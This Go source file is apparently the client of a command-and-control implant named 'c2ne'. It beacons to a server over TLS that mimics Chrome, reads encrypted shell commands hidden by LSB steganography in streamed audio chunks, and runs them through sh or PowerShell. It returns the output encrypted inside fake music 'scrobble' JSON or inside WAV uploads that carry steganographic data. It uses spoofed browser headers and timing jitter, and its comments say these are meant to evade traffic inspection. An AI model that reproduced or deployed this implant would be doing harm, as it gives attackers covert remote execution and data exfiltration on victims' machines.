package main
import "c2ne/internal/crypto"
import (
	"fmt"
	"net"
	"net/http"
	"time"
	"io"
	"log"
	"sync"
	"strings"
	"flag"
	"math/rand"
	"strconv"
	"os/exec"
	"runtime"
	//"os"
	"bufio"
	"bytes"
	"mime/multipart"
	"encoding/json"
	utls "github.com/refraction-networking/utls"
)

type dialResult struct {
	port   string
	status string
}

var key []byte = []byte{
    0x2b, 0x7e, 0x15, 0x16,
    0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88,
    0x09, 0xcf, 0x4f, 0x3c,
}

var c2_server_ip string
var c2_hostname ="c2ne.local"
var timeout time.Duration
var echo_to_stdout = "off"
var firstLoopDone = "false"
var	baseAudioTrack []byte

var http_request_string_pre = "GET /api/v1/sample/chunk/"
var http_request_string_pro = " HTTP/1.1\r\n" +
           "Host: " + c2_hostname + "\r\n" +
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n" +
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" +
           "Accept-Language: en-US,en;q=0.5\r\n" +
           "Connection: keep-alive\r\n" + //keep-alive //close
           "\r\n"

func dialUtls(port string, resultChan chan<- dialResult)(*utls.UConn, *bufio.Reader, error){

	conn, err := net.DialTimeout("tcp", c2_server_ip+":"+port, timeout)
	if err!=nil{
		log.Println(err)
		resultChan <- dialResult{port: port, status: err.Error()}
		return nil, nil, err
	}

	config := &utls.Config{InsecureSkipVerify: true}
	uConn := utls.UClient(conn, config, utls.HelloChrome_Auto)

	err = uConn.Handshake()
	if err != nil {
		log.Println("TLS Handshake Blocked or Failed:", err)
		resultChan <- dialResult{port: port, status: err.Error()}
		return nil, nil, err
	}
	reader := bufio.NewReader(uConn)
	return uConn, reader, nil
}

func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- dialResult){
	
	defer wg.Done()

	//to handle stream download
	uConn, reader, err := dialUtls(port, resultChan)
	if err!=nil{
		fmt.Println("errored out downl utls conn ", err)
	}
	defer uConn.Close()

	//to handle file upload
	uuConn, ureader, uerr := dialUtls(port, resultChan)
	if err!=nil{
		fmt.Println("errored out downl utls conn ", uerr)
	}
	defer uConn.Close()
	
	initialBurst, nReqs_per_delay :=20, 21
	chunkIndex :=0
	conn_err_retry_count :=0
	var delay_per_batch time.Duration
	data := make([]byte, 0 , 4096)

	chunkChan := make(chan []byte, 50) // buffered so request loop doesn't block
	go decoderEngine(chunkChan, uuConn, ureader)

	for{//ideally this loop sleeps for 2 secs every operation, sends a GET req from line 70, and reads data from reader, calls decode engine

		http_request_string := http_request_string_pre + strconv.Itoa(chunkIndex) + http_request_string_pro
		fmt.Fprintf(uConn, http_request_string)
		
		dummyReq := &http.Request{Method: "GET"} //so that we can pass it to next statement
		//ideally, the dummyReq part comes from a valid request string, which we use to write to uConn
		//but this doesnt gaurentee us the order of arrival of headers, which akamai or something specfically looks for.
		//so we go hybrid mode, with fprint (instead of req = http.NewRequest, req.Write(uConn),)
		//and http.ReadResponse to read whatever was sent from the mux function in the server
		resp, err := http.ReadResponse(reader, dummyReq)
		if err!=nil {
			// io.ErrUnexpectedEOF, net.OpError (reset/timeout), etc
			fmt.Println("reading response errored out - ", err)
			conn_err_retry_count++
			if conn_err_retry_count>5{
				conn_err_retry_count =0
				resultChan <- dialResult{port: port, status: err.Error()}
				return
			}
			time.Sleep(2*time.Second)
			continue
		}
		if resp.StatusCode!= http.StatusOK{fmt.Println("iter ", chunkIndex, " code ", resp.StatusCode)}
		switch resp.StatusCode{
			case http.StatusRequestedRangeNotSatisfiable, http.StatusNotFound: //flow wont reach anyplace where response codes 40X exists, lol
				//end of file reached on server, either loop, or move to next file.
				chunkIndex = 0
				continue
			case http.StatusOK, http.StatusCreated:
				data = data[:0]
				data, err:= io.ReadAll(resp.Body)
				if err!=nil{
					fmt.Println("read error 2 - ", err)
				}

				if firstLoopDone=="false"{
					baseAudioTrack = append(baseAudioTrack, data...)
				}

				isLastChunk := resp.Header.Get("X-Last-Chunk")
				if isLastChunk == "true"{
					chunkIndex=-1
					if firstLoopDone=="false"{fmt.Println(firstLoopDone)}
					firstLoopDone="true"
				}
	        	resp.Body.Close()

		        chunkChan <- data //go decoderEngine(data, uuConn, ureader) //decoderEngine -> executeCommand -> upload/scrobble
		        
		        chunkIndex++
		        nReqs_per_delay--
		        if chunkIndex>initialBurst && nReqs_per_delay==0{
		        	nReqs_per_delay, delay_per_batch = calculateJitter(rand.Intn(2)+1)
		        	time.Sleep(delay_per_batch)
		        }
		    default:
		    	fmt.Println("Unexpected status code. All the best!")
		    	return
		}
    }

	resultChan <- dialResult{port: port, status: "success for "+port}	
}


func decoderEngine(chunkChan <- chan []byte, uConn *utls.UConn, reader *bufio.Reader){

	var current_decoded_byte byte
	cmd_bitIndex := 0
	store_command := 0
	var decoded_cmd_byte []byte
	var fifo4 []byte
	var chunkStartCheck = "true"

	for buf := range(chunkChan){
		if chunkStartCheck=="true"{
			for _, stegd_byte := range(buf[:8*4]){ //if server has a command to send, the first 4 bytes would be STRT, unless it is a big command
				lsb := stegd_byte & 1
				current_decoded_byte = (current_decoded_byte << 1) | lsb
				cmd_bitIndex++
				if cmd_bitIndex==8{
					fifo4 = append(fifo4, current_decoded_byte)
					cmd_bitIndex =0
					current_decoded_byte = 0
				}
			}
			if bytes.Equal(fifo4, []byte("STRT")) {
				chunkStartCheck="false" 	//big commands will be taken care, by not performing this chek, until a STOP is encountered
			}else{
				fifo4 = fifo4[:0]
				continue //dont bother decoding rest of the chunk
			}
		}
		
		for _, stegd_byte := range(buf[:len(buf)]){
			/* old logic
			last_bit_str := fmt.Sprintf("%08b", stegd_byte)
			last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
			fmt.Println(last_bit_int)
			*/
			lsb := stegd_byte & 1
			current_decoded_byte = (current_decoded_byte << 1) | lsb

			cmd_bitIndex++
			if cmd_bitIndex==8{
				if store_command==1{
					decoded_cmd_byte = append(decoded_cmd_byte, current_decoded_byte)
				}
				fifo4 = append(fifo4, current_decoded_byte)
				if len(fifo4) > 4{
					fifo4 = fifo4[1:]
				}
				if bytes.Equal(fifo4, []byte("STRT")) {
					store_command = 1
					chunkStartCheck = "false"
				}
				if bytes.Equal(fifo4, []byte("STOP")) {
					store_command = 0
					chunkStartCheck = "true"
					finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)

					finalCommand , err:= crypto.Decrypt(key, []byte(finalCommand))
					if  echo_to_stdout=="true"{fmt.Println("decrypted cmd - ", finalCommand)}
					
					if err!=nil{
						fmt.Println("Client decrypt error -", err)
					}
					decoded_cmd_byte = decoded_cmd_byte[:0]
					fifo4 = fifo4[:0]
					//fmt.Println("$>", finalCommand)
					go executeCommand(finalCommand, uConn, reader) //executeCommand -> upload/scrobble
				}
				//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
				cmd_bitIndex =0
				current_decoded_byte = 0
			}
			//fmt.Println("Recieved bits with value", string(buf), "and bytes ", buf)
		}
	}
}

func main(){

	//user input collection
	target  := flag.String("target", "", "C2 server IP address (required)")
    timeout = *flag.Duration("timeout", 10*time.Second, "probe timeout per port")
    
    flag.Parse()

    if *target == "" {
        fmt.Println("Error: -target is required")
        flag.Usage()
        return
    }
    c2_server_ip = *target
	port_list := []string{"443"}
	
	report := make(map[string]string)
	resultChan := make(chan dialResult, len(port_list))
	var wg sync.WaitGroup

	for _, port := range port_list{
		wg.Add(1)
		go invokeParallelDialups(port, &wg, resultChan)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	for i := 0; i < len(port_list); i++ {
		res := <-resultChan
		report[res.port] = res.status
	}

}

func calculateJitter(sl int) (int, time.Duration){

	var baseDelay time.Duration
	switch sl{
	case 1:
		baseDelay = 2 * time.Second
	case 2:
		fallthrough
	default:
		baseDelay = 6 * time.Second
	}

	//use a variance of +/-20 %
	minMultiplier := 0.8
	maxMultiplier := 1.2
	nReqs_per_delay :=0

	//calculate a random multiplier within that range
	randomMultiplier := minMultiplier + rand.Float64()*(maxMultiplier-minMultiplier)
	actualSleep := time.Duration(float64(baseDelay) * randomMultiplier)

	switch{
	case actualSleep>6*time.Second:
		nReqs_per_delay=7
	case actualSleep > 5*time.Second:
		nReqs_per_delay = 6
	case actualSleep > 4*time.Second:
		nReqs_per_delay = 5
	case actualSleep > 3*time.Second:
		nReqs_per_delay = 4
	case actualSleep > 2*time.Second:
		nReqs_per_delay = 3
	case actualSleep > 1*time.Second:
		nReqs_per_delay = 2
	default:
		nReqs_per_delay =1
	}

	return nReqs_per_delay, actualSleep
}

var targetDir string
func executeCommand(finalCommand string, uConn *utls.UConn, reader *bufio.Reader){
	if len(finalCommand)!=0{
		shellBinary := "sh"
		shellFlag := "-c"
		var formatted_out string
		
		if runtime.GOOS == "windows"{
			shellBinary = "powershell"
			shellFlag = "/C"
		}

		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
		args := strings.Fields(finalCommand)
		switch args[0]{
		case "cd":
			targetDir ="/"
			if len(args)>1{
				if targetDir == "../"||targetDir == "../../"{
					targetDir = targetDir+args[1]
				}
				targetDir=args[1]
			}
		}
		//validate targetDir
		cmd.Dir = targetDir //either this, or os.Chdir, but we would need os.Stat and os.isDir or something for that
		res, err := cmd.Output()
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
        		formatted_out = fmt.Sprintf("%s", string(exitErr.Stderr))
    		}else{
    			formatted_out = "unknown error for " + finalCommand
    		}
		}else{
			formatted_out = strings.TrimSpace(string(res))
		}

		if len(formatted_out)<16{ //temporary threshold 5, until we figure out scrobble
			go uploadOutputAsScrobble(formatted_out, uConn, reader)
			if echo_to_stdout=="on"{
				fmt.Println("sending output through scrobble")
			}

		}else{
			go encoding_engine(formatted_out, uConn, reader)
			if echo_to_stdout=="on"{
				fmt.Println("Sending output through upload")
			}
			
		}
		//fmt.Println("output length - ", len(formatted_out)) 
	}
}

//helper struct for scrobble
type ScrobbleRequest struct{
	Method string `json:"method"`
	Timestamp string `json:"timestamp"`
	TrackID string `json:"track_id"`
	PlayedMs string `json:"played_ms"`
	//DurationMs string `json:"duration_ms"`
	ApiSig []byte `json:"api_sig"` //is where the output lies

}
func uploadOutputAsScrobble(output string, uConn *utls.UConn, reader *bufio.Reader){
	output, _ = crypto.Encrypt(key, []byte(output))
	payload := ScrobbleRequest{
		Method : "track.Scrobble",
		Timestamp : strconv.FormatInt(time.Now().Unix(), 10),
		TrackID : "sample.wav",
		PlayedMs : "2",
		//DurationMs : 
		ApiSig : []byte(output),
	}
	
	body, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Errored out json -",err)
	}

	reqHeader := fmt.Sprintf(
	"POST /api/v1/sample/scrobble HTTP/1.1\r\n"+
	"Host: "+c2_hostname+"\r\n"+
	"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"+
	"Content-Type: application/json\r\n"+
	"Content-Length: %d\r\n"+
	//"Authorization: Bearer %s\r\n"+
	"Accept: application/json\r\n"+
	"Connection: keep-alive\r\n"+
	"\r\n",
	len(body),
	)

	if _, err := io.WriteString(uConn, reqHeader); err != nil {
		fmt.Printf("write header: %w", err)
	}
	if _, err := uConn.Write(body); err != nil {
        fmt.Printf("write body: %w", err)
    }

    dummyReq := &http.Request{Method: "POST"}
    http.ReadResponse(reader, dummyReq)
    
}

func encoding_engine(output string, uConn *utls.UConn, reader *bufio.Reader){
	output, _ = crypto.Encrypt(key, []byte(output))
	output = "STRT"+output+"STOP"

	var newAudioTrack []byte
	ChunkSize := 576
	op_len_threshold := ChunkSize/8
	byteOffset := 0
	totalTrackBytes := len(baseAudioTrack)
	chunk := make([]byte, ChunkSize)
	numChunksEncoded :=0
	pendingOutput :=""
	outputBytes := []byte(output)
	
	/*
	//prepare bitstring for each char of output
	bitstringCmdCharIndex :=0
	var op_bitstring []string
	for _, char := range outputBytes{
		if echo_to_stdout=="on"{
			fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
		}
		op_bitstring = append(op_bitstring, fmt.Sprintf("%08b", char))
		//fmt.Println("Febug 5 - output bitstring state - ", op_bitstring)
	}*/

	for { //loop over baseAudioTrack, 1 ChunkSize at a time
		//fmt.Println("Debug info - loopCounter = ", loopCounter, " totalTrackBytes = ", totalTrackBytes," byteOffset = ", byteOffset)
		
		// Boundary Check: If we reach the end of the file, reset pointer and increment loop
		if byteOffset+ChunkSize > totalTrackBytes{
			byteOffset = 0
		}
		if (len(pendingOutput)==0 && len(outputBytes)==0){
			break
		}

		copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])

		//*********--encode message in the current chunk--******************//
		//---code for byte to bit conversion
		if len(pendingOutput)>0{
			output = pendingOutput[:min(len(pendingOutput), op_len_threshold)]+output
			pendingOutput = pendingOutput[min(len(pendingOutput), op_len_threshold):]
		}
		if len(output)>op_len_threshold{
			pendingOutput += output[op_len_threshold:]
			output = output[:op_len_threshold]
		}

		//----code to inject LSB from op_bitstring array into audio stream.
		outputBytes= []byte(output)
		op_bitIndex :=0
		op_charIndex :=0
		var audio_stegd_bytes []byte

		if echo_to_stdout=="on"{
			fmt.Println("Chunk length = ", len(chunk))
			fmt.Printf("Injecting payload (%d characters)...\n", len(outputBytes))
		}

		for _, aud_byte := range chunk{
			if op_charIndex == len(outputBytes) {
				if echo_to_stdout=="on"{
					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
				}
				break
			}

			/*old logic
			ival, _ := strconv.Atoi(string(op_bitstring[bitstringCmdCharIndex][op_bitIndex]))
			aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
			aud_byte = aud_byte | byte(ival)
			*/
			ival := (outputBytes[op_charIndex] >> (7 - uint(op_bitIndex))) & 1
			aud_byte = (aud_byte & 0xFE) | ival

			audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)

			op_bitIndex++
			if op_bitIndex==8{
				op_charIndex ++
				//bitstringCmdCharIndex ++
				op_bitIndex =0
			}

		}
		copy(chunk[:op_charIndex*8], audio_stegd_bytes[:op_charIndex*8])
		numChunksEncoded++
		
		newAudioTrack = append(newAudioTrack, chunk...)

		//fmt.Println("chunk len verification - ", len(chunk))
		byteOffset = byteOffset + ChunkSize
		output = ""
	}

	if numChunksEncoded*ChunkSize > len(baseAudioTrack){
		//need logic to shove shiz into another upload track. better choose a big one
		fmt.Println("track too small for encoding the whole output")

	}else{
		newAudioTrack = append(newAudioTrack, baseAudioTrack[numChunksEncoded*ChunkSize:]...)
	}

	uploadOutputAsWav(newAudioTrack, numChunksEncoded*ChunkSize, uConn, reader)
}

func uploadOutputAsWav(newAudioTrack []byte, size int, uConn *utls.UConn, reader *bufio.Reader){

	var body bytes.Buffer
    writer := multipart.NewWriter(&body)
	part, err := writer.CreateFormFile("file", "sample.wav") //doesnt create a new file
	if err != nil {
		fmt.Println("Failed 1, ", err)
	}
	if _, err := part.Write(newAudioTrack); err != nil {
		fmt.Println("Failed 2, ", err)
	}

	if err := writer.Close(); err != nil {
		fmt.Println("Failed 3, ", err)
	}
	reqHeader := fmt.Sprintf(
		"POST /api/v1/upload HTTP/1.1\r\n"+
		"Host: "+ c2_hostname +"\r\n"+
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n" +
		"Content-Type: %s\r\n"+
		"Content-Length: %d\r\n"+
		//"Authorization: Bearer %s\r\n"+ //needed?
		"Accept: application/json\r\n"+
		"Connection: keep-alive\r\n"+
		"\r\n",
	writer.FormDataContentType(), // includes the boundary — must match what's in body
	body.Len(),
    //token??
	)

	if _, err := io.WriteString(uConn, reqHeader); err != nil {
		fmt.Errorf("write header: %w", err)
	}
	if _, err := uConn.Write(body.Bytes()); err != nil {
		fmt.Errorf("write body: %w", err)
	}

	dummyReq := &http.Request{Method: "POST"}
	http.ReadResponse(reader, dummyReq)
}
